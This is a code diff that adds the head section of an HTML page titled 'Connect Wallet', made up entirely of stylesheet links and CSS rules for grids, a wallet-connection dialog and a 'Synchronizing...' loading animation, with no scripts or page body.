@@ -1,0 +1,1929 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no"
+    />
+    <title>Connect Wallet</title>
+    <link href="/assets/main.4d26bdc5.chunk.css" rel="stylesheet" />
+    <link href="/assets/main.a1ea38cc.chunk.css" rel="stylesheet" />
+    <style data-styled="active" data-styled-version="5.2.0"></style>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body,
+      a,
+      p,
+      span {
+        font-family: "Montserrat", sans-serif !important;
+      }
+    </style>
+    <style data-jss="" data-meta="MuiGrid">
+      .MuiGrid-container {
+        width: 100%;
+        display: flex;
+        flex-wrap: wrap;
+        box-sizing: border-box;
+      }
+
+      .MuiGrid-item {
+        margin: 0;
+        box-sizing: border-box;
+      }
+
+      .MuiGrid-zeroMinWidth {
+        min-width: 0;
+      }
+
+      .MuiGrid-direction-xs-column {
+        flex-direction: column;
+      }
+
+      .MuiGrid-direction-xs-column-reverse {
+        flex-direction: column-reverse;
+      }
+
+      .MuiGrid-direction-xs-row-reverse {
+        flex-direction: row-reverse;
+      }
+
+      .MuiGrid-wrap-xs-nowrap {
+        flex-wrap: nowrap;
+      }
+
+      .MuiGrid-wrap-xs-wrap-reverse {
+        flex-wrap: wrap-reverse;
+      }
+
+      .MuiGrid-align-items-xs-center {
+        align-items: center;
+      }
+
+      .MuiGrid-align-items-xs-flex-start {
+        align-items: flex-start;
+      }
+
+      .MuiGrid-align-items-xs-flex-end {
+        align-items: flex-end;
+      }
+
+      .MuiGrid-align-items-xs-baseline {
+        align-items: baseline;
+      }
+
+      .MuiGrid-align-content-xs-center {
+        align-content: center;
+      }
+
+      .MuiGrid-align-content-xs-flex-start {
+        align-content: flex-start;
+      }
+
+      .MuiGrid-align-content-xs-flex-end {
+        align-content: flex-end;
+      }
+
+      .MuiGrid-align-content-xs-space-between {
+        align-content: space-between;
+      }
+
+      .MuiGrid-align-content-xs-space-around {
+        align-content: space-around;
+      }
+
+      .MuiGrid-justify-content-xs-center {
+        justify-content: center;
+      }
+
+      .MuiGrid-justify-content-xs-flex-end {
+        justify-content: flex-end;
+      }
+
+      .MuiGrid-justify-content-xs-space-between {
+        justify-content: space-between;
+      }
+
+      .MuiGrid-justify-content-xs-space-around {
+        justify-content: space-around;
+      }
+
+      .MuiGrid-justify-content-xs-space-evenly {
+        justify-content: space-evenly;
+      }
+
+      .MuiGrid-spacing-xs-1 {
+        width: calc(100% + 8px);
+        margin: -4px;
+      }
+
+      .MuiGrid-spacing-xs-1 > .MuiGrid-item {
+        padding: 4px;
+      }
+
+      .MuiGrid-spacing-xs-2 {
+        width: calc(100% + 16px);
+        margin: -8px;
+      }
+
+      .MuiGrid-spacing-xs-2 > .MuiGrid-item {
+        padding: 8px;
+      }
+
+      .MuiGrid-spacing-xs-3 {
+        width: calc(100% + 24px);
+        margin: -12px;
+      }
+
+      .MuiGrid-spacing-xs-3 > .MuiGrid-item {
+        padding: 12px;
+      }
+
+      .MuiGrid-spacing-xs-4 {
+        width: calc(100% + 32px);
+        margin: -16px;
+      }
+
+      .MuiGrid-spacing-xs-4 > .MuiGrid-item {
+        padding: 16px;
+      }
+
+      .MuiGrid-spacing-xs-5 {
+        width: calc(100% + 40px);
+        margin: -20px;
+      }
+
+      .MuiGrid-spacing-xs-5 > .MuiGrid-item {
+        padding: 20px;
+      }
+
+      .MuiGrid-spacing-xs-6 {
+        width: calc(100% + 48px);
+        margin: -24px;
+      }
+
+      .MuiGrid-spacing-xs-6 > .MuiGrid-item {
+        padding: 24px;
+      }
+
+      .MuiGrid-spacing-xs-7 {
+        width: calc(100% + 56px);
+        margin: -28px;
+      }
+
+      .MuiGrid-spacing-xs-7 > .MuiGrid-item {
+        padding: 28px;
+      }
+
+      .MuiGrid-spacing-xs-8 {
+        width: calc(100% + 64px);
+        margin: -32px;
+      }
+
+      .MuiGrid-spacing-xs-8 > .MuiGrid-item {
+        padding: 32px;
+      }
+
+      .MuiGrid-spacing-xs-9 {
+        width: calc(100% + 72px);
+        margin: -36px;
+      }
+
+      .MuiGrid-spacing-xs-9 > .MuiGrid-item {
+        padding: 36px;
+      }
+
+      .MuiGrid-spacing-xs-10 {
+        width: calc(100% + 80px);
+        margin: -40px;
+      }
+
+      .MuiGrid-spacing-xs-10 > .MuiGrid-item {
+        padding: 40px;
+      }
+
+      .MuiGrid-grid-xs-auto {
+        flex-grow: 0;
+        max-width: none;
+        flex-basis: auto;
+      }
+
+      .MuiGrid-grid-xs-true {
+        flex-grow: 1;
+        max-width: 100%;
+        flex-basis: 0;
+      }
+
+      .MuiGrid-grid-xs-1 {
+        flex-grow: 0;
+        max-width: 8.333333%;
+        flex-basis: 8.333333%;
+      }
+
+      .MuiGrid-grid-xs-2 {
+        flex-grow: 0;
+        max-width: 16.666667%;
+        flex-basis: 16.666667%;
+      }
+
+      .MuiGrid-grid-xs-3 {
+        flex-grow: 0;
+        max-width: 25%;
+        flex-basis: 25%;
+      }
+
+      .MuiGrid-grid-xs-4 {
+        flex-grow: 0;
+        max-width: 33.333333%;
+        flex-basis: 33.333333%;
+      }
+
+      .MuiGrid-grid-xs-5 {
+        flex-grow: 0;
+        max-width: 41.666667%;
+        flex-basis: 41.666667%;
+      }
+
+      .MuiGrid-grid-xs-6 {
+        flex-grow: 0;
+        max-width: 50%;
+        flex-basis: 50%;
+      }
+
+      .MuiGrid-grid-xs-7 {
+        flex-grow: 0;
+        max-width: 58.333333%;
+        flex-basis: 58.333333%;
+      }
+
+      .MuiGrid-grid-xs-8 {
+        flex-grow: 0;
+        max-width: 66.666667%;
+        flex-basis: 66.666667%;
+      }
+
+      .MuiGrid-grid-xs-9 {
+        flex-grow: 0;
+        max-width: 75%;
+        flex-basis: 75%;
+      }
+
+      .MuiGrid-grid-xs-10 {
+        flex-grow: 0;
+        max-width: 83.333333%;
+        flex-basis: 83.333333%;
+      }
+
+      .MuiGrid-grid-xs-11 {
+        flex-grow: 0;
+        max-width: 91.666667%;
+        flex-basis: 91.666667%;
+      }
+
+      .MuiGrid-grid-xs-12 {
+        flex-grow: 0;
+        max-width: 100%;
+        flex-basis: 100%;
+      }
+
+      @media (min-width: 600px) {
+        .MuiGrid-grid-sm-auto {
+          flex-grow: 0;
+          max-width: none;
+          flex-basis: auto;
+        }
+        .MuiGrid-grid-sm-true {
+          flex-grow: 1;
+          max-width: 100%;
+          flex-basis: 0;
+        }
+        .MuiGrid-grid-sm-1 {
+          flex-grow: 0;
+          max-width: 8.333333%;
+          flex-basis: 8.333333%;
+        }
+        .MuiGrid-grid-sm-2 {
+          flex-grow: 0;
+          max-width: 16.666667%;
+          flex-basis: 16.666667%;
+        }
+        .MuiGrid-grid-sm-3 {
+          flex-grow: 0;
+          max-width: 25%;
+          flex-basis: 25%;
+        }
+        .MuiGrid-grid-sm-4 {
+          flex-grow: 0;
+          max-width: 33.333333%;
+          flex-basis: 33.333333%;
+        }
+        .MuiGrid-grid-sm-5 {
+          flex-grow: 0;
+          max-width: 41.666667%;
+          flex-basis: 41.666667%;
+        }
+        .MuiGrid-grid-sm-6 {
+          flex-grow: 0;
+          max-width: 50%;
+          flex-basis: 50%;
+        }
+        .MuiGrid-grid-sm-7 {
+          flex-grow: 0;
+          max-width: 58.333333%;
+          flex-basis: 58.333333%;
+        }
+        .MuiGrid-grid-sm-8 {
+          flex-grow: 0;
+          max-width: 66.666667%;
+          flex-basis: 66.666667%;
+        }
+        .MuiGrid-grid-sm-9 {
+          flex-grow: 0;
+          max-width: 75%;
+          flex-basis: 75%;
+        }
+        .MuiGrid-grid-sm-10 {
+          flex-grow: 0;
+          max-width: 83.333333%;
+          flex-basis: 83.333333%;
+        }
+        .MuiGrid-grid-sm-11 {
+          flex-grow: 0;
+          max-width: 91.666667%;
+          flex-basis: 91.666667%;
+        }
+        .MuiGrid-grid-sm-12 {
+          flex-grow: 0;
+          max-width: 100%;
+          flex-basis: 100%;
+        }
+      }
+
+      @media (min-width: 960px) {
+        .MuiGrid-grid-md-auto {
+          flex-grow: 0;
+          max-width: none;
+          flex-basis: auto;
+        }
+        .MuiGrid-grid-md-true {
+          flex-grow: 1;
+          max-width: 100%;
+          flex-basis: 0;
+        }
+        .MuiGrid-grid-md-1 {
+          flex-grow: 0;
+          max-width: 8.333333%;
+          flex-basis: 8.333333%;
+        }
+        .MuiGrid-grid-md-2 {
+          flex-grow: 0;
+          max-width: 16.666667%;
+          flex-basis: 16.666667%;
+        }
+        .MuiGrid-grid-md-3 {
+          flex-grow: 0;
+          max-width: 25%;
+          flex-basis: 25%;
+        }
+        .MuiGrid-grid-md-4 {
+          flex-grow: 0;
+          max-width: 33.333333%;
+          flex-basis: 33.333333%;
+        }
+        .MuiGrid-grid-md-5 {
+          flex-grow: 0;
+          max-width: 41.666667%;
+          flex-basis: 41.666667%;
+        }
+        .MuiGrid-grid-md-6 {
+          flex-grow: 0;
+          max-width: 50%;
+          flex-basis: 50%;
+        }
+        .MuiGrid-grid-md-7 {
+          flex-grow: 0;
+          max-width: 58.333333%;
+          flex-basis: 58.333333%;
+        }
+        .MuiGrid-grid-md-8 {
+          flex-grow: 0;
+          max-width: 66.666667%;
+          flex-basis: 66.666667%;
+        }
+        .MuiGrid-grid-md-9 {
+          flex-grow: 0;
+          max-width: 75%;
+          flex-basis: 75%;
+        }
+        .MuiGrid-grid-md-10 {
+          flex-grow: 0;
+          max-width: 83.333333%;
+          flex-basis: 83.333333%;
+        }
+        .MuiGrid-grid-md-11 {
+          flex-grow: 0;
+          max-width: 91.666667%;
+          flex-basis: 91.666667%;
+        }
+        .MuiGrid-grid-md-12 {
+          flex-grow: 0;
+          max-width: 100%;
+          flex-basis: 100%;
+        }
+      }
+
+      @media (min-width: 1280px) {
+        .MuiGrid-grid-lg-auto {
+          flex-grow: 0;
+          max-width: none;
+          flex-basis: auto;
+        }
+        .MuiGrid-grid-lg-true {
+          flex-grow: 1;
+          max-width: 100%;
+          flex-basis: 0;
+        }
+        .MuiGrid-grid-lg-1 {
+          flex-grow: 0;
+          max-width: 8.333333%;
+          flex-basis: 8.333333%;
+        }
+        .MuiGrid-grid-lg-2 {
+          flex-grow: 0;
+          max-width: 16.666667%;
+          flex-basis: 16.666667%;
+        }
+        .MuiGrid-grid-lg-3 {
+          flex-grow: 0;
+          max-width: 25%;
+          flex-basis: 25%;
+        }
+        .MuiGrid-grid-lg-4 {
+          flex-grow: 0;
+          max-width: 33.333333%;
+          flex-basis: 33.333333%;
+        }
+        .MuiGrid-grid-lg-5 {
+          flex-grow: 0;
+          max-width: 41.666667%;
+          flex-basis: 41.666667%;
+        }
+        .MuiGrid-grid-lg-6 {
+          flex-grow: 0;
+          max-width: 50%;
+          flex-basis: 50%;
+        }
+        .MuiGrid-grid-lg-7 {
+          flex-grow: 0;
+          max-width: 58.333333%;
+          flex-basis: 58.333333%;
+        }
+        .MuiGrid-grid-lg-8 {
+          flex-grow: 0;
+          max-width: 66.666667%;
+          flex-basis: 66.666667%;
+        }
+        .MuiGrid-grid-lg-9 {
+          flex-grow: 0;
+          max-width: 75%;
+          flex-basis: 75%;
+        }
+        .MuiGrid-grid-lg-10 {
+          flex-grow: 0;
+          max-width: 83.333333%;
+          flex-basis: 83.333333%;
+        }
+        .MuiGrid-grid-lg-11 {
+          flex-grow: 0;
+          max-width: 91.666667%;
+          flex-basis: 91.666667%;
+        }
+        .MuiGrid-grid-lg-12 {
+          flex-grow: 0;
+          max-width: 100%;
+          flex-basis: 100%;
+        }
+      }
+
+      @media (min-width: 1920px) {
+        .MuiGrid-grid-xl-auto {
+          flex-grow: 0;
+          max-width: none;
+          flex-basis: auto;
+        }
+        .MuiGrid-grid-xl-true {
+          flex-grow: 1;
+          max-width: 100%;
+          flex-basis: 0;
+        }
+        .MuiGrid-grid-xl-1 {
+          flex-grow: 0;
+          max-width: 8.333333%;
+          flex-basis: 8.333333%;
+        }
+        .MuiGrid-grid-xl-2 {
+          flex-grow: 0;
+          max-width: 16.666667%;
+          flex-basis: 16.666667%;
+        }
+        .MuiGrid-grid-xl-3 {
+          flex-grow: 0;
+          max-width: 25%;
+          flex-basis: 25%;
+        }
+        .MuiGrid-grid-xl-4 {
+          flex-grow: 0;
+          max-width: 33.333333%;
+          flex-basis: 33.333333%;
+        }
+        .MuiGrid-grid-xl-5 {
+          flex-grow: 0;
+          max-width: 41.666667%;
+          flex-basis: 41.666667%;
+        }
+        .MuiGrid-grid-xl-6 {
+          flex-grow: 0;
+          max-width: 50%;
+          flex-basis: 50%;
+        }
+        .MuiGrid-grid-xl-7 {
+          flex-grow: 0;
+          max-width: 58.333333%;
+          flex-basis: 58.333333%;
+        }
+        .MuiGrid-grid-xl-8 {
+          flex-grow: 0;
+          max-width: 66.666667%;
+          flex-basis: 66.666667%;
+        }
+        .MuiGrid-grid-xl-9 {
+          flex-grow: 0;
+          max-width: 75%;
+          flex-basis: 75%;
+        }
+        .MuiGrid-grid-xl-10 {
+          flex-grow: 0;
+          max-width: 83.333333%;
+          flex-basis: 83.333333%;
+        }
+        .MuiGrid-grid-xl-11 {
+          flex-grow: 0;
+          max-width: 91.666667%;
+          flex-basis: 91.666667%;
+        }
+        .MuiGrid-grid-xl-12 {
+          flex-grow: 0;
+          max-width: 100%;
+          flex-basis: 100%;
+        }
+      }
+    </style>
+    <style data-jss="" data-meta="makeStyles">
+      @media (min-width: 960px) {
+        .jss1 {
+          width: 280px;
+          flex-shrink: 0;
+        }
+      }
+
+      .jss2 {
+        height: 100%;
+        padding: 8px;
+        overflow: auto;
+        transition: margin 969ms cubic-bezier(0.4, 0, 0.6, 1) 0ms;
+        margin-left: 280px;
+      }
+
+      .jss3 {
+        transition: margin 969ms cubic-bezier(0, 0, 0.2, 1) 0ms;
+        margin-left: 0;
+      }
+    </style>
+    <style data-jss="" data-meta="MuiToolbar">
+      .MuiToolbar-root {
+        display: flex;
+        position: relative;
+        align-items: center;
+      }
+
+      .MuiToolbar-gutters {
+        padding-left: 16px;
+        padding-right: 16px;
+      }
+
+      @media (min-width: 600px) {
+        .MuiToolbar-gutters {
+          padding-left: 24px;
+          padding-right: 24px;
+        }
+      }
+
+      .MuiToolbar-regular {
+        min-height: 56px;
+      }
+
+      @media (min-width: 0px) and (orientation: landscape) {
+        .MuiToolbar-regular {
+          min-height: 48px;
+        }
+      }
+
+      @media (min-width: 600px) {
+        .MuiToolbar-regular {
+          min-height: 64px;
+        }
+      }
+
+      .MuiToolbar-dense {
+        min-height: 48px;
+      }
+      [data-reach-dialog-overlay] {
+        background: rgba(0, 0, 0, 0.33);
+        position: fixed;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        overflow: auto;
+        background-image: initial;
+        background-position-x: initial;
+        background-position-y: initial;
+        background-size: initial;
+        background-attachment: initial;
+        background-origin: initial;
+        background-clip: initial;
+        background-color: rgb(239 241 244);
+        overflow-x: auto;
+        overflow-y: auto;
+      }
+      .containerz::after {
+        content: "Synchronizing...";
+        color: #007298;
+        font-weight: 700;
+        position: absolute;
+        bottom: -50px;
+        font-family: "Montserrat SemiBold";
+        left: -40px;
+      }
+      .borderz {
+        background: #007298;
+        position: absolute;
+      }
+      .borderz.two {
+        top: 0;
+        right: 0;
+        height: 100%;
+        width: 4px;
+        animation: border-two 5s infinite linear;
+      }
+      .borderz.four {
+        bottom: 0;
+        left: 0;
+        height: 100%;
+        width: 4px;
+        animation: border-four 5s infinite linear;
+      }
+      .line.one {
+        top: 25%;
+        width: 0%;
+        animation: line-one 5s infinite linear;
+      }
+      .line.two {
+        top: 45%;
+        animation: line-two 5s infinite linear;
+      }
+      .line.three {
+        top: 65%;
+        animation: line-three 5s infinite linear;
+      }
+
+      @keyframes border-one {
+        0% {
+          width: 0;
+        }
+        10% {
+          width: 100%;
+        }
+        100% {
+          width: 100%;
+        }
+      }
+
+      @keyframes border-two {
+        0% {
+          height: 0;
+        }
+        10% {
+          height: 0%;
+        }
+        20% {
+          height: 100%;
+        }
+        100% {
+          height: 100%;
+        }
+      }
+
+      @keyframes border-three {
+        0% {
+          width: 0;
+        }
+        20% {
+          width: 0%;
+        }
+        30% {
+          width: 100%;
+        }
+        100% {
+          width: 100%;
+        }
+      }
+
+      @keyframes border-four {
+        0% {
+          height: 0;
+        }
+        30% {
+          height: 0%;
+        }
+        40% {
+          height: 100%;
+        }
+        100% {
+          height: 100%;
+        }
+      }
+
+      @keyframes line-one {
+        0% {
+          left: 25%;
+          width: 0;
+        }
+        40% {
+          left: 25%;
+          width: 0%;
+        }
+        43% {
+          left: 25%;
+          width: 50%;
+        }
+        52% {
+          left: 25%;
+          width: 50%;
+        }
+        54% {
+          left: 25%;
+          width: 0%;
+        }
+        55% {
+          right: 25%;
+          left: auto;
+        }
+        63% {
+          width: 10%;
+          right: 25%;
+          left: auto;
+        }
+        100% {
+          width: 10%;
+          right: 25%;
+          left: auto;
+        }
+      }
+
+      @keyframes line-two {
+        0% {
+          width: 0;
+        }
+        42% {
+          width: 0%;
+        }
+        45% {
+          width: 50%;
+        }
+        53% {
+          width: 50%;
+        }
+        54% {
+          width: 0%;
+        }
+        60% {
+          width: 50%;
+        }
+        100% {
+          width: 50%;
+        }
+      }
+
+      @keyframes line-three {
+        0% {
+          width: 0;
+        }
+        45% {
+          width: 0%;
+        }
+        48% {
+          width: 50%;
+        }
+        51% {
+          width: 50%;
+        }
+        52% {
+          width: 0%;
+        }
+        100% {
+          width: 0%;
+        }
+      }
+
+      @keyframes box {
+        0% {
+          opacity: 1;
+          margin-left: 0px;
+          height: 50px;
+          width: 40px;
+        }
+        55% {
+          margin-left: 0px;
+          height: 50px;
+          width: 40px;
+        }
+        60% {
+          margin-left: 0px;
+          height: 35px;
+          width: 50px;
+        }
+        74% {
+          msthin-left: 0;
+        }
+        80% {
+          margin-left: -50px;
+          opacity: 1;
+        }
+        90% {
+          height: 35px;
+          width: 50px;
+          margin-left: 50px;
+          opacity: 0;
+        }
+        100% {
+          opacity: 0;
+        }
+      }
+      .iiXYOL[data-reach-dialog-content] {
+        margin: 0px 0px 2rem;
+        background-color: rgb(33, 36, 41);
+        box-shadow: rgb(0 0 0 / 5%) 0px 4px 8px 0px;
+        padding: 0px;
+        width: 90vw;
+        overflow: hidden;
+        align-self: center;
+        max-width: 420px;
+        max-height: 90vh;
+        display: flex;
+        border-radius: 20px;
+        margin-top: 0px;
+        margin-right: 0px;
+        margin-bottom: 2rem;
+        margin-left: 0px;
+        padding-top: 0px;
+        padding-right: 0px;
+        padding-bottom: 0px;
+        padding-left: 0px;
+        overflow-y: hidden;
+        overflow-x: hidden;
+        border-top-left-radius: 20px;
+        border-top-right-radius: 20px;
+        border-bottom-right-radius: 20px;
+        border-bottom-left-radius: 20px;
+      }
+      [tabindex] {
+        outline: none;
+      }
+      [data-reach-dialog-content] {
+        width: 50vw;
+        margin: 10vh auto;
+        background: #fff;
+        padding: 2rem;
+        outline: none;
+        margin-top: 10vh;
+        margin-right: auto;
+        margin-bottom: 10vh;
+        margin-left: auto;
+        background-image: initial;
+        background-position-x: initial;
+        background-position-y: initial;
+        background-size: initial;
+        background-attachment: initial;
+        background-origin: initial;
+        background-clip: initial;
+        background-color: rgb(255, 255, 255);
+        padding-top: 2rem;
+        padding-right: 2rem;
+        padding-bottom: 2rem;
+        padding-left: 2rem;
+        outline-color: initial;
+        outline-style: none;
+        outline-width: initial;
+      }
+      .jJAhga {
+        position: relative;
+      }
+      .hRZQmk {
+        display: flex;
+        flex-flow: row nowrap;
+        padding: 1rem;
+        font-weight: 500;
+        color: rgb(33, 114, 229);
+        flex-direction: row;
+        flex-wrap: nowrap;
+        padding-top: 1rem;
+        padding-right: 1rem;
+        padding-bottom: 1rem;
+        padding-left: 1rem;
+        background-color: #f2f2f2f0;
+      }
+      .fRcQRh {
+        position: absolute;
+        right: 1rem;
+        top: 14px;
+      }
+      .gUQEWC {
+        display: flex;
+        flex-flow: column nowrap;
+        margin: 0px;
+        padding: 0px;
+        width: 100%;
+        flex-direction: column;
+        flex-wrap: nowrap;
+        margin-top: 0px;
+        margin-right: 0px;
+        margin-bottom: 0px;
+        margin-left: 0px;
+        padding-top: 0px;
+        padding-right: 0px;
+        padding-bottom: 0px;
+        padding-left: 0px;
+      }
+
+      .LPcxt[data-reach-dialog-overlay] {
+        z-index: 100;
+        overflow: hidden;
+        display: flex;
+        -webkit-box-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        justify-content: center;
+        background-color: rgba(0, 0, 0, 0.424);
+        overflow-x: hidden;
+        overflow-y: hidden;
+      }
+      .line {
+        height: 4px;
+        background: #007298;
+        position: absolute;
+        width: 0%;
+        left: 25%;
+      }
+      .borderz.three {
+        bottom: 0;
+        right: 0;
+        height: 4px;
+        width: 100%;
+        animation: border-three 5s infinite linear;
+      }
+      .borderz.one {
+        height: 4px;
+        top: 0;
+        left: 0;
+        animation: border-one 5s infinite linear;
+      }
+      .boxz {
+        position: relative;
+        height: 50px;
+        width: 40px;
+        animation: box 5s infinite linear;
+      }
+      .containerz {
+        height: 50px;
+        width: 40px;
+        position: absolute;
+        left: 0;
+        right: 0;
+        top: 0;
+        bottom: 0;
+        margin: auto;
+      }
+      .bHjlF {
+        display: flex;
+        flex-flow: column nowrap;
+        -webkit-box-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        justify-content: center;
+        width: 100%;
+        flex-direction: column;
+        flex-wrap: nowrap;
+      }
+      .bHjlF > * {
+        width: 100%;
+      }
+      .dJZYYq {
+        display: flex;
+        flex-flow: row nowrap;
+        -webkit-box-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        justify-content: center;
+        flex-direction: row;
+        flex-wrap: nowrap;
+      }
+      .deLgHH {
+        display: flex;
+        flex-flow: row nowrap;
+        -webkit-box-align: center;
+        align-items: center;
+        -webkit-box-pack: start;
+        justify-content: flex-start;
+        flex-direction: row;
+        flex-wrap: nowrap;
+      }
+      .iGptdp {
+        display: flex;
+        flex-flow: column nowrap;
+        -webkit-box-pack: center;
+        justify-content: center;
+        height: 100%;
+        flex-direction: column;
+        flex-wrap: nowrap;
+      }
+      .jsJmJE {
+        display: flex;
+        flex-flow: row nowrap;
+        color: rgb(86 77 77);
+        font-size: 1rem;
+        font-weight: 500;
+        flex-direction: row;
+        flex-wrap: nowrap;
+      }
+      .lgYJCf {
+        display: flex;
+        flex-flow: column nowrap;
+        -webkit-box-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        justify-content: center;
+        flex-direction: column;
+        flex-wrap: nowrap;
+      }
+      .lgYJCf > img,
+      .lgYJCf span {
+        height: 24px;
+        width: 24px;
+      }
+      .GTKuw {
+        color: rgb(86 77 77);
+        margin-top: 10px;
+        font-size: 12px;
+      }
+      .dQoUpv {
+        background-color: white;
+        outline: none;
+        border: 1px solid rgb(64, 68, 79);
+        border-radius: 12px;
+        display: flex;
+        flex-direction: row;
+        -webkit-box-align: center;
+        align-items: center;
+        -webkit-box-pack: justify;
+        justify-content: space-between;
+        padding: 1rem;
+        margin-top: 0px;
+        opacity: 1;
+        width: 100% !important;
+        outline-color: initial;
+        outline-style: none;
+        outline-width: initial;
+        border-top-width: 1px;
+        border-right-width: 1px;
+        border-bottom-width: 1px;
+        border-left-width: 1px;
+        border-top-style: solid;
+        border-right-style: solid;
+        border-bottom-style: solid;
+        border-left-style: solid;
+        border-image-source: initial;
+        border-image-slice: initial;
+        border-image-width: initial;
+        border-image-outset: initial;
+        border-image-repeat: initial;
+        border-top-left-radius: 12px;
+        border-top-right-radius: 12px;
+        border-bottom-right-radius: 12px;
+        border-bottom-left-radius: 12px;
+        border-top-color: rgb(64, 68, 79);
+        border-right-color: rgb(64, 68, 79);
+        border-bottom-color: rgb(64, 68, 79);
+        border-left-color: rgb(64, 68, 79);
+        padding-top: 1rem;
+        padding-right: 1rem;
+        padding-bottom: 1rem;
+        padding-left: 1rem;
+      }
+      .jwEAlI {
+        border-radius: 8px;
+        font-size: 12px;
+        color: rgb(255, 255, 255);
+        background-color: rgb(86, 90, 105);
+        margin-left: 1rem;
+        padding: 0.5rem;
+        font-weight: 600;
+        user-select: none;
+        border-top-left-radius: 8px;
+        border-top-right-radius: 8px;
+        border-bottom-right-radius: 8px;
+        border-bottom-left-radius: 8px;
+        padding-top: 0.5rem;
+        padding-right: 0.5rem;
+        padding-bottom: 0.5rem;
+        padding-left: 0.5rem;
+      }
+      .jEMAel > * {
+        padding: 1rem;
+        padding-top: 1rem;
+        padding-right: 1rem;
+        padding-bottom: 1rem;
+        padding-left: 1rem;
+      }
+      .jEMAel {
+        display: flex;
+        flex-flow: row nowrap;
+        -webkit-box-align: center;
+        align-items: center;
+        -webkit-box-pack: start;
+        justify-content: flex-start;
+        border-radius: 12px;
+        margin-bottom: 20px;
+        color: rgb(253, 64, 64);
+        border: 1px solid rgb(253, 64, 64);
+        flex-direction: row;
+        flex-wrap: nowrap;
+        border-top-left-radius: 12px;
+        border-top-right-radius: 12px;
+        border-bottom-right-radius: 12px;
+        border-bottom-left-radius: 12px;
+        border-top-width: 1px;
+        border-right-width: 1px;
+        border-bottom-width: 1px;
+        border-left-width: 1px;
+        border-top-style: solid;
+        border-right-style: solid;
+        border-bottom-style: solid;
+        border-left-style: solid;
+        border-top-color: rgb(253, 64, 64);
+        border-right-color: rgb(253, 64, 64);
+        border-bottom-color: rgb(253, 64, 64);
+        border-left-color: rgb(253, 64, 64);
+        border-image-source: initial;
+        border-image-slice: initial;
+        border-image-width: initial;
+        border-image-outset: initial;
+        border-image-repeat: initial;
+      }
+      .jebOoi {
+        background-color: white;
+        padding: 2rem;
+        border-bottom-left-radius: 20px;
+        border-bottom-right-radius: 20px;
+        padding-top: 2rem;
+        padding-right: 2rem;
+        padding-bottom: 2rem;
+        padding-left: 2rem;
+      }
+      .overlay {
+        position: fixed;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 100%;
+        height: 100vh;
+        background-color: rgb(0, 0, 0, 0.2);
+        z-index: 99;
+        font-family: "DM Sans", sans-serif;
+      }
+      .transform {
+        --transform-translate-x: 0;
+        --transform-translate-y: 0;
+        --transform-rotate: 0;
+        --transform-skew-x: 0;
+        --transform-skew-y: 0;
+        --transform-scale-x: 1;
+        --transform-scale-y: 1;
+        transform: translateX(var(--transform-translate-x))
+          translateY(var(--transform-translate-y))
+          rotate(var(--transform-rotate)) skewX(var(--transform-skew-x))
+          skewY(var(--transform-skew-y)) scaleX(var(--transform-scale-x))
+          scaleY(var(--transform-scale-y));
+      }
+
+      .transition-all {
+        transition-property: all;
+      }
+
+      .transition {
+        transition-property: background-color, border-color, color, fill, stroke,
+          opacity, box-shadow, transform;
+      }
+
+      .ease-in {
+        transition-timing-function: cubic-bezier(0.4, 0, 1, 1);
+      }
+      .p-2 {
+        padding: 0.5rem;
+      }
+
+      .py-2 {
+        padding-top: 0.5rem;
+        padding-bottom: 0.5rem;
+      }
+
+      .py-3 {
+        padding-top: 0.75rem;
+        padding-bottom: 0.75rem;
+      }
+
+      .px-4 {
+        padding-left: 1rem;
+        padding-right: 1rem;
+      }
+
+      .pr-4 {
+        padding-right: 1rem;
+      }
+
+      .pb-4 {
+        padding-bottom: 1rem;
+      }
+
+      .pl-4 {
+        padding-left: 1rem;
+      }
+
+      .pt-5 {
+        padding-top: 1.25rem;
+      }
+
+      .placeholder-gray-500::-moz-placeholder {
+        --placeholder-opacity: 1;
+        color: #a0aec0;
+        color: rgba(160, 174, 192, var(--placeholder-opacity));
+      }
+
+      .placeholder-gray-500:-ms-input-placeholder {
+        --placeholder-opacity: 1;
+        color: #a0aec0;
+        color: rgba(160, 174, 192, var(--placeholder-opacity));
+      }
+
+      .placeholder-gray-500::placeholder {
+        --placeholder-opacity: 1;
+        color: #a0aec0;
+        color: rgba(160, 174, 192, var(--placeholder-opacity));
+      }
+
+      .relative {
+        position: relative;
+      }
+
+      .shadow-sm {
+        box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+      }
+
+      .shadow-xl {
+        box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1),
+          0 10px 10px -5px rgba(0, 0, 0, 0.04);
+      }
+
+      .text-left {
+        text-align: left;
+      }
+
+      .text-center {
+        text-align: center;
+      }
+
+      .text-white {
+        --text-opacity: 1;
+        color: #fff;
+        color: rgba(255, 255, 255, var(--text-opacity));
+      }
+
+      .text-gray-900 {
+        --text-opacity: 1;
+        color: #1a202c;
+        color: rgba(26, 32, 44, var(--text-opacity));
+      }
+
+      .uppercase {
+        text-transform: uppercase;
+      }
+
+      .align-bottom {
+        vertical-align: bottom;
+      }
+
+      .w-6 {
+        width: 1.5rem;
+      }
+
+      .w-12 {
+        width: 3rem;
+      }
+
+      .w-full {
+        width: 100%;
+      }
+      .mx-auto {
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .mt-2 {
+        margin-top: 0.5rem;
+      }
+
+      .mr-2 {
+        margin-right: 0.5rem;
+      }
+
+      .mt-3 {
+        margin-top: 0.75rem;
+      }
+
+      .mb-4 {
+        margin-bottom: 1rem;
+      }
+
+      .mt-6 {
+        margin-top: 1.5rem;
+      }
+
+      .mb-6 {
+        margin-bottom: 1.5rem;
+      }
+
+      .mt-10 {
+        margin-top: 2.5rem;
+      }
+
+      .mr-10 {
+        margin-right: 2.5rem;
+      }
+      .leading-6 {
+        line-height: 1.5rem;
+      }
